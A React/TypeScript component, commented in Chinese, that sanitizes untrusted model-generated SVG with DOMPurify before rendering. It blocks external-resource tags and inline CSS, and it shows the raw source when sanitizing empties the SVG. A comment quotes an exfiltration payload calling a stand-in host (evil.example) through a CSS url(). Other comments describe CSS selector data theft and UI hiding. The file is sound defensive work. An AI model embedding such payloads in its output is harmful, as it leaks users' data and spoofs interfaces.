import DOMPurifyImport from 'dompurify';
import { useMemo } from 'react';
import { copySvgAsPng } from '../../../lib/svgImage';
import { DiagramCard } from './DiagramCard';

// vite/node 下 dompurify 的 default 导出可能是嵌套的（ESM/CJS interop）
const DOMPurify =
  (DOMPurifyImport as unknown as { default?: typeof DOMPurifyImport }).default ?? DOMPurifyImport;

/**
 * ```svg 代码块渲染（对齐 Hermes Desktop embeds/svg-embed.tsx）。
 * DOMPurify svg profile 硬消毒后渲染：剥离 script、事件处理器、foreignObject，
 * 模型输出的不可信 SVG 无法执行代码。
 * 展示统一走 DiagramCard（宽度一致/居中/弹窗预览/复制 PNG）。
 */
export function SvgEmbed({ code }: { code: string }) {
  const clean = useMemo(() => {
    // SSR/node 环境无 window，dompurify 无法工作 —— 渲染器在浏览器执行
    if (typeof window === 'undefined') return '';
    return DOMPurify.sanitize(code, {
      USE_PROFILES: { svg: true, svgFilters: true },
      // 禁外部资源元素：feImage/image/use 可携带 href 引用外部 URL，
      // 渲染时触发对外请求（IP/网络探测）——审查 P3 + CodeRabbit Major。
      // style 也必须禁（审查 P3 实证）：DOMPurify 的 CSS 过滤只剥
      // @import/javascript:/expression() 等，任意选择器和 url() 探测放行
      // ——内联 style 的 CSS 作用于整个文档（非 SVG 局部），模型输出可
      // 隐藏/伪造 UI（body{display:none}）或经属性选择器外带输入值。
      // 流程图不需要内嵌 CSS，直接禁掉整个 style 元素。
      FORBID_TAGS: ['feImage', 'image', 'use', 'style'],
      // style 属性同样封死（审查 R5 P1）：DOMPurify 非 CSS sanitizer，
      // style="fill:url(https://evil.example/x)" 会触发外部资源请求/数据
      // 外带，不在其默认防护内——流程图不需要任意 CSS，整属性剥掉。
      FORBID_ATTR: ['style'],
    });
  }, [code]);

  // SSR/node 无 window：消毒无法执行——静默（浏览器水合后正常渲染）
  if (typeof window === 'undefined') return null;

  // 消毒后为空壳（script-only / 纯事件处理器被整块剥离，只剩 <svg></svg>
  // 外壳）——显示源码而非空白卡（审查 P3）：用户能看到模型输出了什么。
  // 纯文本渲染无任何执行面。
  const isHollow = (() => {
    if (!clean.trim()) return true;
    try {
      const doc = new DOMParser().parseFromString(clean, 'image/svg+xml');
      const root = doc.querySelector('svg');
      if (!root) return true;
      return ![...root.childNodes].some(
        (n) => n.nodeType === 1 || (n.nodeType === 3 && Boolean(n.textContent?.trim()))
      );
    } catch {
      return false; // 解析失败交给 DiagramCard 路径展示
    }
  })();

  if (isHollow) {
    return (
      <pre
        className="my-2 rounded-lg overflow-x-auto max-w-full px-3 py-2 text-xs font-mono whitespace-pre-wrap break-words"
        style={{ background: 'rgba(0,0,0,0.06)', color: 'var(--text-muted)' }}
      >
        {code}
      </pre>
    );
  }

  return <DiagramCard svg={clean} label="SVG 图" onCopy={async () => copySvgAsPng(clean)} />;
}
